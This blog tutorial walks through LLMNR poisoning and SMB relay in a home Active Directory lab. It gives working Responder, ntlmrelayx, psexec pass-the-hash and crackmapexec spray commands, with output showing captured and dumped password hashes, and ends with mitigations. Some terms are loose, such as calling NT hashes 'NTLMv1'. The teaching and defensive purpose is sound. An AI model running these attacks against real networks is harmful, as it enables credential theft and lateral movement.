---
layout:	post
title:  "AD Initial-Attacks: LLMNR Poisoning & SMB Relay"
date:   2024-07-16 11:11:11 +0200
categories: [Active Directory]
tags: [Active Directory]
---

## Pre-requisites

[AD: Fundamentals (venuschhantel.com.np)](https://venuschhantel.com.np/posts/AD_Fundamentals/)

<br>

## AD Environment

The AD environment for the LLMNR poisoning and SMB relay attack walkthrough is illustrated in the image below.

![AD Environment](/images/2024-07-21-AD_Initial_Attacks_LLMNR Poisoning_&_SMB_Relay/1.png)

<br>

## LLMNR Poisoning

### LLMNR

LLMNR, or Link-Local Multicast Name Resolution, is a protocol based on DNS that allow name resolution for hosts on same local link. LLMNR is upgraded version of NBT-NS (NetBIOS Name Service) and is enabled by default. LLMNR perform name resolution when DNS is unavailable or DNS cannot resolve the name.

 In Windows, computer perform name resolution in same network with following hierarchy:

- Checks the hosts file of file system (C:\Windows\System32\drivers\etc\hosts)
- Checks the local DNS cache.
- Query DNS server on local network
- Sends LLMNR query

LLMNR works as follows:

- When a host requests an unknown domain name, LLMNR broadcasts a Name Resolution Request (NRR) packet to all devices on the network, asking for that hostname.
- If a device on the network has the requested hostname, it responds with a Name Resolution Response (NRP) containing its IP address to establish a connection.
- If the requested resource requires authentication, LLMNR sends the username and NTLMv2 hash of the requesting device to the device with that hostname.

The third step in above step is the **flaw** within LLMNR. It make it vulnerable to MITM attacks. Attackers can listen for those LLMNR request on UDP port 5355 and spoof as the requested name to grab the username and NTLMv2 hash.

<br>

### LLMNR Poisoning Walkthrough

To carry out LLMNR poisoning, we will use a tool called Responder from the ‘hecker’ machine. Execute the responder with following command to listen for any LLMNR requests made by devices on the network.

```bash
sudo responder -I eth0
```

Suppose the 'ape' user from PC1 mistypes the SMB share `\\banana\where`as `\\bananana\where`. Responder will spoof as the mistyped domain and respond, capturing the username and NTLMv2 hash of the ‘ape’ user.

Responder output the username and NTLMv2 hash of the ‘ape’ user as shown below.

```bash
[*] [MDNS] Poisoned answer sent to 192.168.190.129 for name bananana.local
[*] [MDNS] Poisoned answer sent to fe80::4927:ce11:d0aa:ff69 for name bananana.local
[*] [LLMNR]  Poisoned answer sent to fe80::4927:ce11:d0aa:ff69 for name bananana
[*] [LLMNR]  Poisoned answer sent to 192.168.190.129 for name bananana
[*] [MDNS] Poisoned answer sent to 192.168.190.129 for name bananana.local
[*] [MDNS] Poisoned answer sent to fe80::4927:ce11:d0aa:ff69 for name bananana.local
[*] [LLMNR]  Poisoned answer sent to fe80::4927:ce11:d0aa:ff69 for name bananana
[*] [LLMNR]  Poisoned answer sent to 192.168.190.129 for name bananana
[SMB] NTLMv2-SSP Client   : fe80::4927:ce11:d0aa:ff69
[SMB] NTLMv2-SSP Username : APEWITHINTERNET\ape
[SMB] NTLMv2-SSP Hash     : ape::APEWITHINTERNET:dbca3473cf3369e5:55371D0AEC7E4F4BF3F91AE109464849:0101000000000000001778E84DDBDA0172C995E4FFB10B9A0000000002000800560039004600300001001E00570049004E002D0056004F0035005400430051005200470036003200580004003400570049004E002D0056004F003500540043005100520047003600320058002E0056003900460030002E004C004F00430041004C000300140056003900460030002E004C004F00430041004C000500140056003900460030002E004C004F00430041004C0007000800001778E84DDBDA01060004000200000008003000300000000000000001000000002000008A8776E7A16EC4F7CD39A22D79EF9C298FB23C2205E64C7674485EC43FBD9D020A0010000000000000000000000000000000000009001A0063006900660073002F00620061006E0061006E0061006E0061000000000000000000                                                                                                                                 
[*] [NBT-NS] Poisoned answer sent to 192.168.190.129 for name BANANANA (service: File Server)
```

The obtained NTLMv2 hash can be cracked if the password is common or easily guessable. However, if the password is complex and difficult to crack, we can relay the NTLMv2 hash to authenticate on other devices, which will be covered in next section.

<br>

## SMB Relay

### SMB & NTLM Authentication

SMB is a network file-sharing protocol that uses NTLM for authentication. NTLM authentication is a challenge-response authentication protocol, which operates as follows:

- After the user enters their password, its processed using a hashing algorithm to generate a password hash.
- The user’s machine then send logon request to DC with username.
- The DC responds with logon challenge (random number).
- The user’s machine encrypts the logon challenge using the password hash and sends the encrypted challenge back to DC.
    - This step is why NTLM authentication is referred to as challenge-response authentication.
- The DC has list of users’ password hash so DC retrieve that user’s password hash from its users’ password hash list and encrypts the logon challenge.
- The DC then compares the result of its encryption with the response sent by the user’s machine.
    - If the result match, the user is authenticated

The **flaw** with NTLM authentication is that if attacker gain access to username and password hash, they can successfully complete the logon challenge. So its vulnerable to MITM attacks.

If the username and  NTLMv2 hash is retrieved via LLMNR poisoning, then it can be relayed to other devices to authenticate in them.

- Additionally, SMB must be disabled or not required on target machine to relay.
    - Windows Server will have SMB Signing enabled and enforced by default.
    - Most Windows Desktop OS will have disabled or not required by default. So Windows Desktop OS can be targeted.

<br>

### SMB Relay Walkthrough

As mentioned above, the target machines should have SMB disabled or not required to perform SMB relay. Using Nmap, the target network 192.168.190.0/24 was scanned with an NSE script to identify potential targets.

```bash
nmap --script=smb2-security-mode.nse -p 445 192.168.190.0/24 -Pn
```

```bash
Nmap scan report for 192.168.190.129
Host is up (0.0054s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap scan report for 192.168.190.130
Host is up (0.0053s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Nmap scan report for 192.168.190.131
Host is up (0.0052s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Nmap scan report for 192.168.190.132
Host is up (0.0051s latency).
```

From the Nmap output, it was identified that 192.168.190.129 and 192.168.190.131 are potential targets for SMB relay as they have SMB Signing not required. Those two target IP were saved under ‘target.txt’ which will be used later.

![Targets](/images/2024-07-21-AD_Initial_Attacks_LLMNR Poisoning_&_SMB_Relay/2.png)

To carry out SMB relay, we will use Responder and ntlmrelayx from the ‘hecker’ machine. We will follow the same steps in Responder as when performing LLMNR poisoning. However, before running the command, we need to configure Responder by editing /etc/responder/Responder.conf to turn off the SMB and HTTP servers to not only capture the hash but also relay them.

![Configuration](/images/2024-07-21-AD_Initial_Attacks_LLMNR Poisoning_&_SMB_Relay/3.png)

After configuring repeat the same step as before by executing Responder with following command to listen for any LLMNR requests made by devices on the network.

```bash
sudo responder -I eth0
```

Then, execute ntlmrelayx to relay the captured NTLMv2 hashes to the target machines which were identified with Nmap. Various options available with ntlmrelayx, which are shown below. Again, suppose the 'ape' user from PC1 mistypes the SMB share `\\banana\where`as `\\bananana\where`.

- **Interactive (-i)**
    
    This option will open up SMB client shell on 127:0.0.1:11000 after successfully relaying the NTLMv2 hash.
    
    ```bash
    sudo python3 ntlmrelayx.py -tf target.txt -smb2support -i
    ```
    
    ```bash
    [*] Servers started, waiting for connections
    [*] SMBD-Thread-4 (process_request_thread): Connection from APEWITHINTERNET/APE@192.168.190.129 controlled, attacking target smb://192.168.190.129
    [-] Authenticating against smb://192.168.190.129 as APEWITHINTERNET/APE FAILED
    [*] SMBD-Thread-5 (process_request_thread): Connection from APEWITHINTERNET/APE@192.168.190.129 controlled, attacking target smb://192.168.190.131
    [*] Authenticating against smb://192.168.190.131 as APEWITHINTERNET/APE SUCCEED
    [*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
    ```
    
    We can connect the SMB client shell using Netcat as can be seen below.
    
    ```bash
    nc 127.0.0.1 11000
    
    Type help for list of commands
    # shares
    ADMIN$
    C$
    IPC$
    
    # use C$
    
    # ls
    drw-rw-rw-          0  Sat Jul 20 02:54:52 2024 $Recycle.Bin
    drw-rw-rw-          0  Sun Jul 21 11:10:36 2024 $WinREAgent
    drw-rw-rw-          0  Fri Jul 19 21:51:20 2024 Documents and Settings
    -rw-rw-rw-       8192  Sun Jul 21 11:37:54 2024 DumpStack.log.tmp
    -rw-rw-rw-  321318912  Sun Jul 21 11:37:54 2024 pagefile.sys
    drw-rw-rw-          0  Fri Jul 19 22:48:54 2024 PerfLogs
    drw-rw-rw-          0  Sat Jul 20 02:31:38 2024 Program Files
    drw-rw-rw-          0  Fri Jul 19 22:48:54 2024 Program Files (x86)
    drw-rw-rw-          0  Fri Jul 19 17:17:56 2024 ProgramData
    drw-rw-rw-          0  Fri Jul 19 21:51:25 2024 Recovery
    -rw-rw-rw-   16777216  Sun Jul 21 11:37:54 2024 swapfile.sys
    drw-rw-rw-          0  Fri Jul 19 17:06:28 2024 System Volume Information
    drw-rw-rw-          0  Sat Jul 20 02:23:50 2024 Users
    drw-rw-rw-          0  Sun Jul 21 11:38:25 2024 Windows
    ```

- **Command (-c)**
    
    This option will execute command after successfully relaying the NTLMv2 hash.
    
    ```bash
    python3 ntlmrelayx.py -t 192.168.190.129,192.168.190.131 -smb2support -c "whoami"
    ```
    
    ```bash
    [*] SMBD-Thread-5 (process_request_thread): Connection from APEWITHINTERNET/APE@192.168.190.129 controlled, attacking target smb://192.168.190.131
    [*] Authenticating against smb://192.168.190.131 as APEWITHINTERNET/APE SUCCEED
    [*] SMBD-Thread-5 (process_request_thread): Connection from APEWITHINTERNET/APE@192.168.190.129 controlled, attacking target smb://192.168.190.129
    [-] Authenticating against smb://192.168.190.129 as APEWITHINTERNET/APE FAILED
    [*] Service RemoteRegistry is in stopped state
    [*] Service RemoteRegistry is disabled, enabling it
    [*] Starting service RemoteRegistry
    [*] Executed specified command on host: 192.168.190.131
    nt authority\system
    ```
    

- **Normal**
    
    Providing no option will dump local account username and NTLMv1 hash from SAM after successfully relaying the NTLMv2 hash.
    
    ```bash
    python3 ntlmrelayx.py -t 192.168.190.129,192.168.190.131 -smb2support
    ```
    
    ```bash
    [*] Servers started, waiting for connections
    [*] SMBD-Thread-4 (process_request_thread): Connection from APEWITHINTERNET/APE@192.168.190.129 controlled, attacking target smb://192.168.190.129
    [-] Authenticating against smb://192.168.190.129 as APEWITHINTERNET/APE FAILED
    [*] SMBD-Thread-5 (process_request_thread): Connection from APEWITHINTERNET/APE@192.168.190.129 controlled, attacking target smb://192.168.190.131
    [*] Authenticating against smb://192.168.190.131 as APEWITHINTERNET/APE SUCCEED
    [*] SMBD-Thread-5 (process_request_thread): Connection from APEWITHINTERNET/APE@192.168.190.129 controlled, attacking target smb://192.168.190.129
    [-] Authenticating against smb://192.168.190.129 as APEWITHINTERNET/APE FAILED
    [*] Service RemoteRegistry is in stopped state
    [*] Service RemoteRegistry is disabled, enabling it
    [*] Starting service RemoteRegistry
    [*] Target system bootKey: 0x8d01cad614d36e2f826eba4da294b4a2
    [*] SMBD-Thread-7 (process_request_thread): Connection from APEWITHINTERNET/APE@192.168.190.129 controlled, but there are no more targets left!
    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:5a4fe3581c32af7cab5b27c35f1713cd:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:948865a45cd982b0c7adb86ad0bf5614:::
    monkee:1001:aad3b435b51404eeaad3b435b51404ee:7963148d4ea1e2636dbfaeb4b0fa84db:::
    [*] Done dumping SAM hashes for host: 192.168.190.131
    [*] Stopping service RemoteRegistry
    [*] Restoring the disabled state for service RemoteRegistry
    [*] SMBD-Thread-8 (process_request_thread): Connection from APEWITHINTERNET/APE@192.168.190.129 controlled, but there are no more targets left!
    ```
<br>


## Additional

Using the above dumped local account and NTLMv1 hash, we can perform pass-attack (pass-the-hash) to login to those local accounts.

```bash
impacket-psexec administrator@192.168.190.131 -hashes aad3b435b51404eeaad3b435b51404ee:5a4fe3581c32af7cab5b27c35f1713cd
```

```bash
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 192.168.190.131.....
[*] Found writable share ADMIN$
[*] Uploading file XIEkSgGb.exe
[*] Opening SVCManager on 192.168.190.131.....
[*] Creating service UDaV on 192.168.190.131.....
[*] Starting service UDaV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19045.4651]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> hostname
PC2
```

Also we can spray attack using the NTLMv1 hash over the network to identify all the devices where those local account are validated as well as dump local account NTLMv1 hash from SAM of validated devices.

```bash
crackmapexec smb 192.168.190.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:5a4fe3581c32af7cab5b27c35f1713cd --local-auth --sam
```

```bash
SMB         192.168.190.131 445    PC2              [*] Windows 10.0 Build 19041 x64 (name:PC2) (domain:PC2) (signing:False) (SMBv1:False)
SMB         192.168.190.130 445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:DC) (signing:True) (SMBv1:False)
SMB         192.168.190.129 445    PC1              [*] Windows 10.0 Build 19041 x64 (name:PC1) (domain:PC1) (signing:False) (SMBv1:False)
SMB         192.168.190.131 445    PC2              [+] PC2\administrator:5a4fe3581c32af7cab5b27c35f1713cd (Pwn3d!)
SMB         192.168.190.130 445    DC               [-] DC\administrator:5a4fe3581c32af7cab5b27c35f1713cd STATUS_LOGON_FAILURE 
SMB         192.168.190.129 445    PC1              [+] PC1\administrator:5a4fe3581c32af7cab5b27c35f1713cd (Pwn3d!)
SMB         192.168.190.131 445    PC2              [+] Dumping SAM hashes
SMB         192.168.190.129 445    PC1              [+] Dumping SAM hashes
SMB         192.168.190.131 445    PC2              Administrator:500:aad3b435b51404eeaad3b435b51404ee:5a4fe3581c32af7cab5b27c35f1713cd:::
SMB         192.168.190.129 445    PC1              Administrator:500:aad3b435b51404eeaad3b435b51404ee:5a4fe3581c32af7cab5b27c35f1713cd:::
SMB         192.168.190.131 445    PC2              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.190.129 445    PC1              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.190.131 445    PC2              DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.190.129 445    PC1              DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.190.131 445    PC2              WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:948865a45cd982b0c7adb86ad0bf5614:::
SMB         192.168.190.129 445    PC1              WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:bcd1933b0c8639d3e03ea418c5add9ab:::
SMB         192.168.190.131 445    PC2              monkee:1001:aad3b435b51404eeaad3b435b51404ee:7963148d4ea1e2636dbfaeb4b0fa84db:::
SMB         192.168.190.131 445    PC2              [+] Added 5 SAM hashes to the database
SMB         192.168.190.129 445    PC1              ape:1001:aad3b435b51404eeaad3b435b51404ee:0c9d2bfafd647e8bca4f77479726bc64:::
SMB         192.168.190.129 445    PC1              [+] Added 5 SAM hashes to the database
```

<br>

## Mitigations

- Disable LLMNR and NBT-NS from group policy
    - To disable LLMNR
        - Computer Configuration > Administrative Templates > Network > DNS Client
            - Set ‘Turn off Multicast Name Resolution’ to Enabled
    - To disable NBT-NS
        - Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab
            - Set ‘Disable NetBIOS over TCP/IP’
- Enable SMB Signing from group policy
    - Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
        - Enable
            - **Microsoft network client: Digitally sign communications (always)**
            - **Microsoft network client: Digitally sign communications (if server agrees)**
            - **Microsoft network server: Digitally sign communications (always)**
            - **Microsoft network server: Digitally sign communications (if client agrees)**
- Disable NTLM authentication on network
- Network segmentations
- Follow principal of least privilege